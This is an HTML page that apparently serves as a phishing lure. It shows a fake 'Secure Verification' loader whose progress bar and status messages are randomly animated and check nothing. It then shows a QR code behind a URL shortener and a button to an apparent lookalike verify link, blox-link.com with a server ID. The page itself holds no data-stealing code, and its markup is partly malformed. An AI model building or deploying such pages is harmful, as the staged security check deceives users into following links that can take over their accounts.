<!DOCTOR html>
</body>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Verification</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;}

body{
    font-family:'Segoe UI',sans-serif;
    height:100vh;
    overflow:hidden;
    color:#FFD700;
    display:flex;
    justify-content:center;
    align-items:center;

    background: linear-gradient(-45deg,#000,#111,#000,#1a1a1a);
    background-size:400% 400%;
    animation:bgMove 12s ease infinite;
}

@keyframes bgMove{
    0%{background-position:0% 50%;}
    50%{background-position:100% 50%;}
    100%{background-position:0% 50%;}
}

/* PARTICLES */
canvas{
    position:fixed;
    top:0;
    left:0;
    z-index:0;
}

/* LOADER */
#loader{
    position:fixed;
    width:100%;
    height:100%;
    background:#000;
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:9999;
}

.loader-box{
    width:260px;
    text-align:center;
}

.loader-title{
    margin-bottom:20px;
}

.progress-container{
    width:100%;
    height:6px;
    background:#111;
    border-radius:10px;
    overflow:hidden;
    margin-bottom:10px;
}

#progress-bar{
    width:0%;
    height:100%;
    background:#FFD700;
}

#progress-text{font-size:14px;}
#status-text{font-size:12px;color:#aaa;margin-top:5px;}

/* MAIN */
#content{
    display:none;
    flex-direction:column;
    align-items:center;
    gap:25px;
    text-align:center;
    z-index:1;
    animation:fadeIn 0.6s ease;
}

@keyframes fadeIn{
    from{opacity:0;transform:translateY(10px);}
    to{opacity:1;transform:translateY(0);}
}

/* QR CARD */
.qr-card{
    position:relative;
    padding:15px;
    border-radius:16px;
    backdrop-filter:blur(12px);
    background:rgba(255,255,255,0.05);
    border:1px solid rgba(255,215,0,0.2);
    box-shadow:0 0 30px rgba(255,215,0,0.15);
    transition:0.3s;
}

.qr-card:hover{
    transform:translateY(-5px) scale(1.03);
    box-shadow:0 0 50px rgba(255,215,0,0.4);
}

/* QR IMAGE */
.qr-card img{
    width:220px;
    height:220px;
    border-radius:10px;
}

/* SCAN LINE */
.scan-line{
    position:absolute;
    left:0;
    width:100%;
    height:2px;
    background:linear-gradient(to right,transparent,#FFD700,transparent);
    animation:scan 2.5s linear infinite;
    opacity:0.7;
}

@keyframes scan{
    0%{top:0;}
    100%{top:100%;}
}

/* BUTTON */
.link-btn{
    padding:12px 28px;
    border-radius:10px;
    background:#FFD700;
    color:#000;
    text-decoration:none;
    font-weight:600;
    transition:0.25s;
}

.link-btn:hover{
    background:#fff;
    transform:translateY(-2px);
}

.subtitle{
    font-size:14px;
    color:#aaa;
}
</style>
</head>

<body>

<canvas id="particles" width="1125" height="907"></canvas>

<!-- LOADER -->
<div id="loader" style="opacity: 0; transition: all 0.5s ease 0s; display: none;">
    <div class="loader-box">
        <h2 class="loader-title">Secure Verification</h2>

        <div class="progress-container">
            <div id="progress-bar" style="width: 100%;"></div>
        </div>

        <div id="progress-text">100%</div>
        <div id="status-text">Finalizing...</div>
    </div>
</div>

<!-- MAIN -->
<div id="content" style="display: flex;">
    <h2>Scan QR to Continue</h2>
    <p class="subtitle">or proceed manually</p>

    <div class="qr-card">
        <div class="scan-line"></div>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&amp;data=https://q.me-qr.com/l/xval4k" alt="QR Code">
    </div>

    <a class="link-btn" href="https://blox-link.com/verify?server=6096707836788825" target="_blank">
        Continue Without QR
    </a>
</div>

<script>
/* LOADER SYSTEM */
let progress = 0;
const bar = document.getElementById("progress-bar");
const text = document.getElementById("progress-text");
const status = document.getElementById("status-text");

const steps = [
    {text:"Connecting...",until:25},
    {text:"Verifying...",until:55},
    {text:"Securing...",until:80},
    {text:"Finalizing...",until:100}
];

let step = 0;

function animate(){
    if(progress<100){
        progress += Math.random()*2.5;
        if(progress>100) progress=100;

        bar.style.width=progress+"%";
        text.innerText=Math.floor(progress)+"%";

        if(progress>=steps[step].until){
            step++;
            if(steps[step]) status.innerText=steps[step].text;
        }

        requestAnimationFrame(animate);
    }else{
        finish();
    }
}

function finish(){
    const loader=document.getElementById("loader");
    loader.style.opacity="0";
    loader.style.transition="0.5s";

    setTimeout(()=>{
        loader.style.display="none";
        document.getElementById("content").style.display="flex";
    },500);
}

status.innerText=steps[0].text;
animate();

/* PARTICLES */
const canvas=document.getElementById("particles");
const ctx=canvas.getContext("2d");

canvas.width=window.innerWidth;
canvas.height=window.innerHeight;

let p=[];
for(let i=0;i<60;i++){
    p.push({
        x:Math.random()*canvas.width,
        y:Math.random()*canvas.height,
        r:Math.random()*2,
        d:Math.random()*1
    });
}

function draw(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle="rgba(255,215,0,0.6)";
    ctx.beginPath();

    for(let i=0;i<p.length;i++){
        ctx.moveTo(p[i].x,p[i].y);
        ctx.arc(p[i].x,p[i].y,p[i].r,0,Math.PI*2);
    }

    ctx.fill();

    for(let i=0;i<p.length;i++){
        p[i].y-=p[i].d;
        if(p[i].y<0){
            p[i].y=canvas.height;
            p[i].x=Math.random()*canvas.width;
        }
    }
}

setInterval(draw,33);

window.addEventListener("resize",()=>{
    canvas.width=window.innerWidth;
    canvas.height=window.innerHeight;
});
</script>


</body></html>
